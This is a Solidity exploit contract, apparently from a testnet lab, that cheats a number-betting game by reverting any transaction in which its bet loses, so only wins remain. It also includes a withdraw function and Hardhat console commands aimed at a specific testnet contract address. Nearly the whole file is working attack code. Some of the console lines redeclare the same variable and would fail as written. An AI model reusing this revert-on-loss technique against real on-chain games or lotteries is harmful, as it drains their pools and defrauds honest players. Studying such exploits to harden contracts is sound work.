// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface BetNumberInterface {
    function betNumber(uint256 bet) payable external returns (bool);
}

contract BetNumberAttacker {
    constructor() payable {
    }

    receive() external payable {
    }

    function cheatBetNumber(address betNumberAddress) external {
        uint256 pool = address(this).balance;
        // play a game
        BetNumberInterface b = BetNumberInterface(betNumberAddress);
        b.betNumber{value: 1}(50);
        // require win the game
        require(address(this).balance >= pool, "lose the game");
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// yarn hardhat console --network thunder-testnet
// const BetNumber = await ethers.getContractFactory("BetNumber");
// const b = BetNumber.attach("0xCB68554F995C45AB7B7e238b19826cFEf964a1e5")
// await b.contractBalance()
// await b.betNumber(ethers.constants.MaxUint256 , {value: 10})
// await b.contractBalance()
// let f = b.filters.didWin()
// let b = await ethers.provider.getBlockNumber()
// await b.queryFilter(f, b - 1000, b)
// b.betNumber(1 , {value: 10})
